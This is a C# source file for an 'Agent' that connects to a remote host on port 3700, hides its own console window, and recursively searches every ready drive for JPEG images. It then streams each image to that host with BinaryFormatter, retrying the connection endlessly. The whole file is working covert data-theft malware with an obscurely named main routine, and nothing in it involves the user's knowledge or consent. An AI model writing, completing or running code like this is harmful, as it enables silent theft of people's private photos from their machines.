using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;

namespace RemoteImageSender
{
    class Agent
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
		
		private TcpClient Client = null;
        private string _host = null;

        const int SW_HIDE = 0;

        private Image GetImage(string path)
        {
            if (File.Exists(path))
                return Image.FromFile(path);
            else
                return null;
        }

        public void Init()
        {
            try
            {
                if(_host != String.Empty)
                {
                    Client = new TcpClient();
                    Client.Connect(_host, 3700);

                    if (Client.Connected)
                    {
                        Thread readingThread = new Thread(new ThreadStart(GermanSheford));
                        readingThread.Start();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Init();
            }
        }

        private void SendImage(Image img, string name)
        {
            if (Client.Connected)
            {
                BinaryFormatter formatter = new BinaryFormatter();
                formatter.Serialize(Client.GetStream(), new object[] { name, img });
            }
        }

        private void GermanSheford()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            List<string> driveList = activeDrives();
            List<string> excludeList = new List<string>();
            excludeList.Add("Windows");
            excludeList.Add("AppData");
            excludeList.Add("Program Files");
            excludeList.Add("ProgramData");
            excludeList.Add("~");
            excludeList.Add("$");

            foreach (string drive in driveList)
            {
                foreach (var file in TraverseDirectory(drive, excludeList, f => f.Extension == ".jpg" || f.Extension == ".jpeg"))
                {
                    Debug.WriteLine(file.FullName, "Path");
                    Send(file.FullName, file.Name);
                }
            }
        }

        private void Send(string path, string name)
        {
            try
            {
                Image img = GetImage(path);
                if (img != null)
                    SendImage(img, name);
            }
            catch (Exception e)
            {
                Debug.WriteLine(path.ToString(), "Error");
                Debug.WriteLine(e.Message, "Error");
            }
        }

        private IEnumerable<FileInfo> TraverseDirectory(string rootPath, List<string> excludeList, Func<FileInfo, bool> Pattern)
        {
            var directoryStack = new Stack<DirectoryInfo>();
            directoryStack.Push(new DirectoryInfo(rootPath));
            while (directoryStack.Count > 0)
            {
                var dir = directoryStack.Pop();
                if (exclude(dir.FullName, excludeList))
                {
                    try
                    {
                        foreach (var i in dir.GetDirectories())
                            directoryStack.Push(i);
                    }
                    catch (UnauthorizedAccessException)
                    {
                        continue; 
                    }
                    foreach (var f in dir.GetFiles().Where(Pattern)) 
                        yield return f;
                }
            }
        }

        private bool exclude(string FileFullName, List<string> excludeList)
        {
            foreach (string i in excludeList)
                if (FileFullName.Contains(i))
                    return false;
            return true;
        }

        private List<string> activeDrives()
        {
            List<string> ToReturn = new List<string>();
            new List<DriveInfo>(DriveInfo.GetDrives()).ForEach(v =>
            {
                if (v.IsReady)
                    ToReturn.Add(v.Name);
            });
            return ToReturn;
        }

        public Agent(string _host)
        {
            this._host = _host;
        }
    }
}
